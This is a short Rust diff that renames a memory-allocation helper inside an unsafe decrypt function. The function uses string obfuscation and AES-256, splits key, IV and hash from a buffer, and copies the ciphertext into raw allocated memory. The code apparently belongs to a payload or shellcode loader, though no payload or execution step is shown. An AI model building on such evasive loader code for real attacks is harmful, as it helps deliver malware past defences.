@@ -1,4 +1,4 @@
-use crate::alloc_mem::alloc_mem;
+use crate::alloc::alloc;
 use obfstr::obfstr;
 pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
     use aes::Aes256;
@@ -20,7 +20,7 @@ pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
     let hash = &decoded[key_len + iv_len..key_len + iv_len + hash_len];
     let encrypted = &decoded[key_len + iv_len + hash_len..];
     
-    let p = unsafe { alloc_mem(encrypted.len())? };
+    let p = unsafe { alloc(encrypted.len())? };
     std::ptr::copy_nonoverlapping(encrypted.as_ptr(), p, encrypted.len());
     let buf = std::slice::from_raw_parts_mut(p, encrypted.len());
     
